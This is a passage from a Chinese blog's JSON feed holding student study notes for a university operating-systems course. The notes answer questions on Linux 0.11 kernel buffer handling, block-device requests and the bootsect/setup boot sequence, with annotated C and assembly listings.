class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">sys_sync</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> i;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">buffer_head</span> * <span class=\"title\">bh</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tsync_inodes();\t\t<span class=\"comment\">/* write out inodes into buffers */</span></span><br><span class=\"line\">\tbh = start_buffer;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i=<span class=\"number\">0</span> ; i&lt;NR_BUFFERS ; i++,bh++) &#123;</span><br><span class=\"line\">\t\twait_on_buffer(bh);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (bh-&gt;b_dirt)</span><br><span class=\"line\">\t\t\tll_rw_block(WRITE,bh);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"29、详细分析进程调度的全过程。考虑所有可能（signal、alarm除外）\"><a href=\"#29、详细分析进程调度的全过程。考虑所有可能（signal、alarm除外）\" class=\"headerlink\" title=\"29、详细分析进程调度的全过程。考虑所有可能（signal、alarm除外）\"></a>29、详细分析进程调度的全过程。考虑所有可能（signal、alarm除外）</h1><p>p103 p125</p>\n<h1 id=\"30、wait-on-buffer函数中为什么不用if（）而是用while（）？\"><a href=\"#30、wait-on-buffer函数中为什么不用if（）而是用while（）？\" class=\"headerlink\" title=\"30、wait_on_buffer函数中为什么不用if（）而是用while（）？\"></a>30、wait_on_buffer函数中为什么不用if（）而是用while（）？</h1><p>​\t\t因为它可能会执行很多次呀,要进行轮询,if只能判断一次,那为啥可能会执行很多次呢? 因为操作系统是很复杂,存在很多种可能,其中一种就是:</p>\n<p>​\t\t很多歌进程都在等待同一个缓冲块,在缓冲块同步完毕的时候,唤醒各个等待进程到轮转到某一个进程的过程中,很有可能此时的缓冲块又被其他进程占用了,并且被加上了锁. 如果用if的话,只判断一次,就会出现错误,while的话则会重新判断.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fs/buffer.c</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title function_\">wait_on_buffer</span><span class=\"params\">(<span class=\"keyword\">struct</span> buffer_head * bh)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tcli();</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (bh-&gt;b_lock)</span><br><span class=\"line\">\t\tsleep_on(&amp;bh-&gt;b_wait); <span class=\"comment\">//bh在哪? bh全局的,buf init那里</span></span><br><span class=\"line\">\t<span class=\"comment\">//不要傻等,切进程, 有主动轮询变为被动响应</span></span><br><span class=\"line\">\tsti();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"31、操作系统如何利用b-uptodate保证缓冲块数据的正确性？new-block-int-dev-函数新申请一个缓冲块后，并没有读盘，b-uptodate却被置1，是否会引起数据混乱？详细分析理由。\"><a href=\"#31、操作系统如何利用b-uptodate保证缓冲块数据的正确性？new-block-int-dev-函数新申请一个缓冲块后，并没有读盘，b-uptodate却被置1，是否会引起数据混乱？详细分析理由。\" class=\"headerlink\" title=\"31、操作系统如何利用b_uptodate保证缓冲块数据的正确性？new_block (int dev)函数新申请一个缓冲块后，并没有读盘，b_uptodate却被置1，是否会引起数据混乱？详细分析理由。\"></a>31、操作系统如何利用b_uptodate保证缓冲块数据的正确性？new_block (int dev)函数新申请一个缓冲块后，并没有读盘，b_uptodate却被置1，是否会引起数据混乱？详细分析理由。</h1><p>p325、328、329</p>\n<p>​\t\tb_uptodate针对进程方向,它的作用是告诉内核,只要缓冲块的b_uptodate位1,则缓冲块的数据就是数据块中最新的了,可以放心地支持进程共享缓冲块的数据.反之如果为0,就提醒内核缓冲块并没有用绑定的数据块中的数据更新,不支持进程共享该缓冲块</p>\n<p>​\t\tnew_block是在设备商申请一个新的数据块,那么数据块里面此时是脏数据,不用管(<font color=\"red\">是要管的,需要清零</font>),那为啥把b_uptodate设置为1呢,因为缓冲块里也是脏数据,<font color=\"red\">缓冲块和数据块都是脏数据,根本就不需要同步,同步也是浪费时间和精力</font></p>\n<p>​\t\t下面进行详细的分析,新建的数据块只能用于两种用途,一种是存储文件的内容,一种是存储文件的i_zone的间接块管理信息.</p>\n<p>​\t\t如果是存储文件的内容的话,就是上面所说,都是垃圾数据,不需要同步,不需要清零的其实,问题已经解决(或者说本身没有问题)</p>\n<p>​\t\t如果是存储i_zone的间接块管理信息,<font color=\"red\">则必须将缓冲块清零,表示没有索引间接数据块,否则垃圾数据会导致索引错误,破坏文件操作的正确性</font>,这个时候虽然缓冲块和硬盘数据块的数据不一致,但和第一种情况一样,b_uptodate设置为1即可\t</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fs/Bitmap.c</span><br><span class=\"line\"> <span class=\"type\">int</span> <span class=\"title function_\">new_block</span><span class=\"params\">(<span class=\"type\">int</span> dev)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">.........</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (bh-&gt;b_count != <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\tpanic(<span class=\"string\">&quot;new block: count is != 1&quot;</span>);</span><br><span class=\"line\">\tclear_block(bh-&gt;b_data);</span><br><span class=\"line\">\tbh-&gt;b_uptodate = <span class=\"number\">1</span>;</span><br><span class=\"line\">\tbh-&gt;b_dirt = <span class=\"number\">1</span>;</span><br><span class=\"line\">\tbrelse(bh);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> j;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"32、add-request（）函数中有下列代码-其中的xxx是什么意思？\"><a href=\"#32、add-request（）函数中有下列代码-其中的xxx是什么意思？\" class=\"headerlink\" title=\"32、add_request（）函数中有下列代码   其中的xxx是什么意思？\"></a>32、add_request（）函数中有下列代码   其中的xxx是什么意思？</h1><p>p121</p>\n<p>赵炯的书p202</p>\n<p>​\t\t测试块设备的当前请求项指针是不是为空(也就是没有请求项,设备空闲)，如果是的话,就会设置该新建的请求项为当前请求项,作为请求项链表的表头</p>\n<p>kernel&#x2F;blk_dev&#x2F;ll_rw_block.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * add-request adds a request to the linked list.</span></span><br><span class=\"line\"><span class=\"comment\"> * It disables interrupts so that it can muck with the</span></span><br><span class=\"line\"><span class=\"comment\"> * request-lists in peace.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">add_request</span><span class=\"params\">(<span class=\"keyword\">struct</span> blk_dev_struct * dev, <span class=\"keyword\">struct</span> request * req)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">.....</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!(tmp = dev-&gt;current_request)) &#123;</span><br><span class=\"line\">\t\tdev-&gt;current_request = req;</span><br><span class=\"line\">\t\tsti();</span><br><span class=\"line\">\t\t(dev-&gt;request_fn)(); <span class=\"comment\">// </span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">.....</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">问的是,以下代码</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!(tmp = dev-&gt;current_request)) &#123;</span><br><span class=\"line\">\t\tdev-&gt;current_request = req;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"33、do-hd-request-函数中dev的含义始终一样吗？\"><a href=\"#33、do-hd-request-函数中dev的含义始终一样吗？\" class=\"headerlink\" title=\"33、do_hd_request()函数中dev的含义始终一样吗？\"></a>33、do_hd_request()函数中dev的含义始终一样吗？</h1><p>p122</p>\n<p>赵炯p195</p>\n<p>kernel&#x2F;blk_dev&#x2F;hd.c</p>\n<h1 id=\"34、read-intr（）函数中，下列代码是什么意思？为什么这样做\"><a href=\"#34、read-intr（）函数中，下列代码是什么意思？为什么这样做\" class=\"headerlink\" title=\"34、read_intr（）函数中，下列代码是什么意思？为什么这样做?\"></a>34、read_intr（）函数中，下列代码是什么意思？为什么这样做?</h1><p>p131</p>\n<p>​\t\tread_intr()函数会将已经读到硬盘缓存中的数据复制到刚才被锁定的那个缓冲块中(注意,锁定的意思是阻止进程方面的操作,而不是阻止外设方面的操作)</p>\n<p>​\t\t但是一次不一定就读完呀,所以就会有下面的代码,来判断请求项对应的缓冲块的数据是否读完了,如果没有读完的话,内核将再次把read_intr()绑定在硬盘中断服务程序上,以待下次使用,之后中断服务程序返回</p>\n<p>​\t\t其实还没太理解这个–,是减的什么东西</p>\n<p>kernel&#x2F;blk_dev&#x2F;hd.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">read_intr</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (win_result()) &#123;</span><br><span class=\"line\">\t\tbad_rw_intr();</span><br><span class=\"line\">\t\tdo_hd_request();</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tport_read(HD_DATA,CURRENT-&gt;buffer,<span class=\"number\">256</span>);</span><br><span class=\"line\">\tCURRENT-&gt;errors = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tCURRENT-&gt;buffer += <span class=\"number\">512</span>;</span><br><span class=\"line\">\tCURRENT-&gt;sector++;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (--CURRENT-&gt;nr_sectors) &#123;</span><br><span class=\"line\">\t\tdo_hd = &amp;read_intr; <span class=\"comment\">//再来一次</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tend_request(<span class=\"number\">1</span>); <span class=\"comment\">//</span></span><br><span class=\"line\">\tdo_hd_request();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">问的是这一段代码是什么意思</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (--CURRENT-&gt;nr_sectors) &#123;</span><br><span class=\"line\">\t\tdo_hd = &amp;read_intr; <span class=\"comment\">//再来一次</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t请求项的结构体在哪?</p>\n<p>kernel&#x2F;lkd_drv&#x2F;blk.h</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * Ok, this is an expanded form so that we can use the same</span></span><br><span class=\"line\"><span class=\"comment\"> * request for paging requests when that is implemented. In</span></span><br><span class=\"line\"><span class=\"comment\"> * paging, &#x27;bh&#x27; is NULL, and &#x27;waiting&#x27; is used to wait for</span></span><br><span class=\"line\"><span class=\"comment\"> * read/write completion.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">request</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> dev;\t\t<span class=\"comment\">/* -1 if no request */</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> cmd;\t\t<span class=\"comment\">/* READ or WRITE */</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> errors;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> sector;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> nr_sectors;</span><br><span class=\"line\">\t<span class=\"type\">char</span> * buffer;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">task_struct</span> * <span class=\"title\">waiting</span>;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">buffer_head</span> * <span class=\"title\">bh</span>;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">request</span> * <span class=\"title\">next</span>;</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"35、bread（）函数代码中为什么要做第二次if-bh-gt-b-uptodate-判断\"><a href=\"#35、bread（）函数代码中为什么要做第二次if-bh-gt-b-uptodate-判断\" class=\"headerlink\" title=\"35、bread（）函数代码中为什么要做第二次if (bh-&gt;b_uptodate)判断?\"></a>35、bread（）函数代码中为什么要做第二次if (bh-&gt;b_uptodate)判断?</h1><p>p112、134.   赵炯 p342</p>\n<p>第一次是在找有没有被使用过的</p>\n<p>fs&#x2F;buffer.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * bread() reads a specified block and returns the buffer that contains</span></span><br><span class=\"line\"><span class=\"comment\"> * it. It returns NULL if the block was unreadable.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> buffer_head * <span class=\"title function_\">bread</span><span class=\"params\">(<span class=\"type\">int</span> dev,<span class=\"type\">int</span> block)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">buffer_head</span> * <span class=\"title\">bh</span>;</span></span><br><span class=\"line\"><span class=\"comment\">// </span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!(bh=getblk(dev,block))) <span class=\"comment\">//找不到就应该继续等,所以不应该为空</span></span><br><span class=\"line\">\t\tpanic(<span class=\"string\">&quot;bread: getblk returned NULL\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (bh-&gt;b_uptodate)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> bh;</span><br><span class=\"line\">\tll_rw_block(READ,bh); <span class=\"comment\">//开始读写硬盘了,硬盘驱动</span></span><br><span class=\"line\">\twait_on_buffer(bh);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (bh-&gt;b_uptodate)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> bh;</span><br><span class=\"line\">\tbrelse(bh);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"36、getblk（）函数中，两次调用wait-on-buffer（）函数，两次的意思一样吗？\"><a href=\"#36、getblk（）函数中，两次调用wait-on-buffer（）函数，两次的意思一样吗？\" class=\"headerlink\" title=\"36、getblk（）函数中，两次调用wait_on_buffer（）函数，两次的意思一样吗？\"></a>36、getblk（）函数中，两次调用wait_on_buffer（）函数，两次的意思一样吗？</h1><p>p125 bread里面一次</p>\n<h1 id=\"37、getblk（）函数中-do-if-tmp-gt-b-count-continue-if-bh-BADNESS-tmp-lt-BADNESS-bh-bh-x3D-tmp-if-BADNESS-tmp-break-x2F-and-repeat-until-we-find-something-good-x2F-while-tmp-x3D-tmp-gt-b-next-free-x3D-free-list-说明什么情况下执行continue、break。\"><a href=\"#37、getblk（）函数中-do-if-tmp-gt-b-count-continue-if-bh-BADNESS-tmp-lt-BADNESS-bh-bh-x3D-tmp-if-BADNESS-tmp-break-x2F-and-repeat-until-we-find-something-good-x2F-while-tmp-x3D-tmp-gt-b-next-free-x3D-free-list-说明什么情况下执行continue、break。\" class=\"headerlink\" title=\"37、getblk（）函数中    do {        if (tmp-&gt;b_count)            continue;        if (!bh || BADNESS(tmp)&lt;BADNESS(bh)) {            bh &#x3D; tmp;            if (!BADNESS(tmp))                break;        }&#x2F;* and repeat until we find something good *&#x2F;    } while ((tmp &#x3D; tmp-&gt;b_next_free) !&#x3D; free_list);说明什么情况下执行continue、break。\"></a>37、getblk（）函数中    do {        if (tmp-&gt;b_count)            continue;        if (!bh || BADNESS(tmp)&lt;BADNESS(bh)) {            bh &#x3D; tmp;            if (!BADNESS(tmp))                break;        }&#x2F;* and repeat until we find something good *&#x2F;    } while ((tmp &#x3D; tmp-&gt;b_next_free) !&#x3D; free_list);说明什么情况下执行continue、break。</h1><h1 id=\"38、make-request（）函数-if-req-lt-request-if-rw-ahead-unlock-buffer-bh-return-sleep-on-amp-wait-for-request-goto-repeat\"><a href=\"#38、make-request（）函数-if-req-lt-request-if-rw-ahead-unlock-buffer-bh-return-sleep-on-amp-wait-for-request-goto-repeat\" class=\"headerlink\" title=\"38、make_request（）函数        if (req &lt; request) {        if (rw_ahead) {            unlock_buffer(bh);            return;        }        sleep_on(&amp;wait_for_request);        goto repeat;\"></a>38、make_request（）函数        if (req &lt; request) {        if (rw_ahead) {            unlock_buffer(bh);            return;        }        sleep_on(&amp;wait_for_request);        goto repeat;</h1><h1 id=\"其中的sleep-on-amp-wait-for-request-是谁在等？等什么？\"><a href=\"#其中的sleep-on-amp-wait-for-request-是谁在等？等什么？\" class=\"headerlink\" title=\"其中的sleep_on(&amp;wait_for_request)是谁在等？等什么？\"></a>其中的sleep_on(&amp;wait_for_request)是谁在等？等什么？</h1><h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><p>《Linux内核设计的艺术 第二版》 新设计团队</p>\n<p>《Linux内核完全注释》 赵炯</p>\n<p>《IA32》 手册 第三卷</p>\n<p><a href=\"https://www.likecs.com/show-204742912.html\">https://www.likecs.com/show-204742912.html</a></p>\n<p><a href=\"https://github.com/sunym1993/flash-linux0.11-talk\">https://github.com/sunym1993/flash-linux0.11-talk</a></p>\n",
            "tags": [
                "研究生课程"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/",
            "url": "https://tangzichengcc.github.io/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/",
            "title": "ucas-操作系统-思考题上",
            "date_published": "2022-11-13T10:20:59.000Z",
            "content_html": "<h1 id=\"思考题-上\"><a href=\"#思考题-上\" class=\"headerlink\" title=\"思考题 上\"></a>思考题 上</h1><h1 id=\"1-为什么开始启动计算机的时候，执行的是BIOS代码而不是操作系统自身的代码？\"><a href=\"#1-为什么开始启动计算机的时候，执行的是BIOS代码而不是操作系统自身的代码？\" class=\"headerlink\" title=\"1.为什么开始启动计算机的时候，执行的是BIOS代码而不是操作系统自身的代码？\"></a>1.为什么开始启动计算机的时候，执行的是BIOS代码而不是操作系统自身的代码？</h1><p>p1</p>\n<p>因为在启动加电时,操作系统本身还没有加载进内存,内存中是空的(或者说乱七八糟的东西?),无法进行执行.(CPU的逻辑电路被设定为只能运行内存中的程序) 而bios中的代码是写死的,所以可以直接跳转到biso处进行执行.</p>\n<h1 id=\"2-为什么BIOS只加载了一个扇区，后续扇区却是由bootsect代码加载？为什么BIOS没有直接把所有需要加载的扇区都加载？\"><a href=\"#2-为什么BIOS只加载了一个扇区，后续扇区却是由bootsect代码加载？为什么BIOS没有直接把所有需要加载的扇区都加载？\" class=\"headerlink\" title=\"2.为什么BIOS只加载了一个扇区，后续扇区却是由bootsect代码加载？为什么BIOS没有直接把所有需要加载的扇区都加载？\"></a>2.为什么BIOS只加载了一个扇区，后续扇区却是由bootsect代码加载？为什么BIOS没有直接把所有需要加载的扇区都加载？</h1><p>加载了一个扇区之后,操作系统就有能力继续加载后续的扇区了,这样做的原因大概是为了减小bios的大小? 或者提高速度? 或者给操作系统设计者更大的自由空间?</p>\n<p>bootsect需要进行规划内存,(为啥bios不能规划呢? 因为取决于操作系统?不同的操作系统不一样),进行一些自定义的内容. 而且bios来的话,应该是比较慢的,全加载进去再执行的话,一个是慢,还有就是不灵活.所以linux采用的是边加载边执行的思路! </p>\n<p>上面的回答大概应该都有一点</p>\n<h1 id=\"3-为什么BIOS把bootsect加载到0x07c00，而不是0x00000？加载后又马上挪到0x90000处，是何道理？为什么不一次加载到位？\"><a href=\"#3-为什么BIOS把bootsect加载到0x07c00，而不是0x00000？加载后又马上挪到0x90000处，是何道理？为什么不一次加载到位？\" class=\"headerlink\" title=\"3.为什么BIOS把bootsect加载到0x07c00，而不是0x00000？加载后又马上挪到0x90000处，是何道理？为什么不一次加载到位？\"></a>3.为什么BIOS把bootsect加载到0x07c00，而不是0x00000？加载后又马上挪到0x90000处，是何道理？为什么不一次加载到位？</h1><p>p8</p>\n<p>感觉这就是个约定问题,就好像12345这样一样</p>\n<p>挪到0x90000是因为操作系统设计者对内存的规划,原先加载到0x07c00是统一的,之后可以按照自己的分配来进行</p>\n<h1 id=\"4-bootsect、setup、head程序之间是怎么衔接的？给出代码证据。\"><a href=\"#4-bootsect、setup、head程序之间是怎么衔接的？给出代码证据。\" class=\"headerlink\" title=\"4.bootsect、setup、head程序之间是怎么衔接的？给出代码证据。\"></a>4.bootsect、setup、head程序之间是怎么衔接的？给出代码证据。</h1><p><img src=\"/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/Untitled.png\" alt=\"Untitled\"></p>\n<p><img src=\"/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/Untitled1.png\" alt=\"Untitled1\"></p>\n<h2 id=\"bootsect和setup的衔接\"><a href=\"#bootsect和setup的衔接\" class=\"headerlink\" title=\"bootsect和setup的衔接\"></a>bootsect和setup的衔接</h2><p>bootsect 把自己移位,然后先把setup加载到0x90200开始的四个扇区,又把从硬盘第 6 个扇区开始往后的 240 个扇区，加载到内存 0x10000 处</p>\n<p>然后通过下面这条指令跳转到setup</p>\n<p>jmpi\t0,SETUPSEG; 0x9020 跳转到setup.s开始继续执行了!!! (此时还是实模式, 偏移地址+ 基地址, 0+ 0x9020*0x10 &#x3D; 0x90200</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">;移位</span><br><span class=\"line\">entry start </span><br><span class=\"line\">start: \t\t\t\t\t;内存中<span class=\"number\">0x07C00</span>对应的就是这里</span><br><span class=\"line\">\tmov\tax,#BOOTSEG  ;<span class=\"number\">0x07C00</span></span><br><span class=\"line\">\tmov\tds,ax</span><br><span class=\"line\">\tmov\tax,#INITSEG  ;<span class=\"number\">0x9000</span></span><br><span class=\"line\">\tmov\tes,ax        ;进行复制,挪位置,把<span class=\"number\">0x07c00</span> 挪到<span class=\"number\">0x9000</span></span><br><span class=\"line\">\tmov\tcx,#<span class=\"number\">256</span></span><br><span class=\"line\">\tsub\tsi,si</span><br><span class=\"line\">\tsub\tdi,di</span><br><span class=\"line\">\trep</span><br><span class=\"line\">\tmovw        ;移动一个字 两个字节  <span class=\"number\">512</span> /<span class=\"number\">2</span> <span class=\"number\">-256</span>次</span><br><span class=\"line\">\tjmpi\tgo,INITSEG ; 跳到新的位置,</span><br><span class=\"line\">;加载setup.s的四个扇区</span><br><span class=\"line\">load_setup: ; 加载<span class=\"number\">4</span>个扇区</span><br><span class=\"line\">\tmov\tdx,#<span class=\"number\">0x0000</span>\t\t! drive <span class=\"number\">0</span>, head <span class=\"number\">0</span></span><br><span class=\"line\">\tmov\tcx,#<span class=\"number\">0x0002</span>\t\t! sector <span class=\"number\">2</span>, track <span class=\"number\">0</span></span><br><span class=\"line\">\tmov\tbx,#<span class=\"number\">0x0200</span>\t\t! address = <span class=\"number\">512</span>, in INITSEG</span><br><span class=\"line\">\tmov\tax,#<span class=\"number\">0x0200</span>+SETUPLEN\t! service <span class=\"number\">2</span>, nr of sectors</span><br><span class=\"line\">\t<span class=\"type\">int</span>\t<span class=\"number\">0x13</span>\t\t\t! read it  bios的中断,读取磁盘</span><br><span class=\"line\">\tjnc\tok_load_setup\t\t! ok - <span class=\"keyword\">continue</span></span><br><span class=\"line\">\tmov\tdx,#<span class=\"number\">0x0000</span></span><br><span class=\"line\">\tmov\tax,#<span class=\"number\">0x0000</span>\t\t! reset the diskette</span><br><span class=\"line\">\t<span class=\"type\">int</span>\t<span class=\"number\">0x13</span></span><br><span class=\"line\">\tj\tload_setup</span><br><span class=\"line\">;加载head和剩余的操作系统</span><br><span class=\"line\">ok_load_setup:</span><br><span class=\"line\">! 把从硬盘第 <span class=\"number\">6</span> 个扇区开始往后的 <span class=\"number\">240</span> 